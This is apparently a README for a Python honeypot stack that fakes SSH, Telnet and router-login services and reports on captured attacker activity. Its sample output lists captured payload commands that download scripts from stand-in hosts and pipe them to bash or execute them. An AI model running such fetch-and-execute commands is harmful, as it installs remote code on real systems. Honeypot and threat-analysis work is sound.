# X11 — Honeypot Program (Full Stack)

Lightweight honeypot stack with async SSH, HTTP admin page, Telnet harvester, and Cowrie-style analytics.

## Overview

This project implements a full honeypot stack in pure Python:
- An asyncio SSH honeypot that accepts connections, fakes logins, and logs commands
- A fake HTTP admin/router-login page via http.server
- A Telnet banner-harvesting honeypot via raw sockets
- A Cowrie-style log replay and analytics module that ingests JSON event streams
- Produces a 30-day-campaign-style analytics report with volume curves, top credentials, payload samples
- All servers run locally in a short demo with configurable timeouts
- Embedded sample event data for fully offline demonstration

## Features

- **SSH honeypot**: asyncio-based TCP server with fake banner, credential logging, command capture
- **HTTP admin page**: Realistic router admin login page with POST credential capture
- **Telnet harvester**: Socket-based banner and credential capture with command logging
- **Analytics engine**: Cowrie-style event aggregation with timeline, top IPs, top credentials
- **Payload capture**: Identifies wget/curl/malware download commands
- **Timeline visualization**: Hourly activity volume chart from embedded events
- **Offline demo**: Embedded 30-event dataset covering multiple attack campaigns
- **Protocol analysis**: Per-protocol (ssh/http/telnet) event breakdown

## Installation

```bash
# No external dependencies required — uses only asyncio, http.server, socket
python3 honeypot_stack.py
```

## Usage

```bash
# Run full offline demo with all honeypots + analytics
python3 honeypot_stack.py

# Import as module
from honeypot_stack import SSHHoneypot, CowrieAnalytics, EMBEDDED_EVENTS
analytics = CowrieAnalytics(EMBEDDED_EVENTS)
report = analytics.generate_report()
```

## Example Output

```
[*] X11 — Honeypot Program (Full Stack)
[*] Running offline self-test with embedded event data...

[*] Simulating SSH honeypot (asyncio)...
    Captured 8 events from SSH honeypot
[*] Simulating HTTP admin honeypot...
    Captured 2 events from HTTP honeypot
[*] Simulating Telnet banner-harvesting honeypot...
    Captured 4 events from Telnet honeypot

[*] Generating Cowrie-style analytics report...
======================================================================
  X11 — Honeypot Stack — 30-Day Campaign Analytics Report
======================================================================

  Total events:              44
  Total login attempts:      15
  Successful logins:         8
  Failed logins:             7
  Total commands executed:   20
  Unique source IPs:         5
  Unique sessions:           10

  --- Top Source IPs ---
    185.220.101.42      8 events
    45.33.32.156        5 events
    103.75.201.13       3 events

  --- Top Passwords ---
    password             3 attempts
    123456               2 attempts
    root                 2 attempts

  --- Payload Samples Captured ---
    $ wget http://malware.evil/payload.sh -O /tmp/payload.sh
    $ curl http://botnet.c2/update.sh | bash
    $ chmod +x /tmp/payload.sh && /tmp/payload.sh
```

## IMPORTANT: Read before use.

### Authorization Requirements
- You MUST have explicit written permission from the network owner before deploying honeypots
- Deploying honeypots on networks you do not own is illegal in most jurisdictions
- This tool should ONLY be used in isolated lab environments or on networks you administer
- Honeypots that accept real connections may capture data from uninvolved parties — handle with care

### Legal Framework
- **Computer Fraud and Abuse Act (CFAA)**: Operating services that capture credentials without authorization may violate federal law
- **Wiretap Act (18 U.S.C. § 2511)**: Capturing network communications without consent may constitute illegal wiretapping
- **Electronic Communications Privacy Act (ECPA)**: Regulates access to stored and transmitted electronic communications
- **State Wiretapping Laws**: Many states require all-party consent for recording communications
- **GDPR/CCPA**: Captured credentials and commands may contain personal data subject to privacy regulations

### Acceptable Use
- Lab environments with fully isolated, air-gapped test networks
- Authorized deception technology deployment with written organizational approval
- Academic research in controlled environments with IRB oversight
- Security education and training with synthetic data or your own test infrastructure
- Production honeypots deployed by incident response teams with proper legal review

### Prohibited Use
- Deploying honeypots on networks without administrator authorization
- Capturing credentials from uninvolved third parties without consent
- Using captured credentials for unauthorized access to any system
- Deploying on production networks without change management and legal approval
- Any activity that violates applicable wiretapping, computer crime, or privacy laws
- Commercial deployment without proper licensing and compliance review

### No Warranty
This software is provided "AS IS" without warranty of any kind. The author is not responsible for any misuse or damage caused by this software. Captured data may be incomplete or inaccurate.

### Responsible Disclosure
If you discover attacker activity through honeypot data, follow responsible disclosure practices:
1. Notify the affected parties privately where possible
2. Preserve evidence without modifying or destroying logs
3. Report to law enforcement or CERT if criminal activity is detected
4. Do not use captured attacker data for unauthorized actions
5. Follow your organization's incident response procedures
6. Share threat intelligence with appropriate ISACs/ISAOs per your authority

## License

MIT
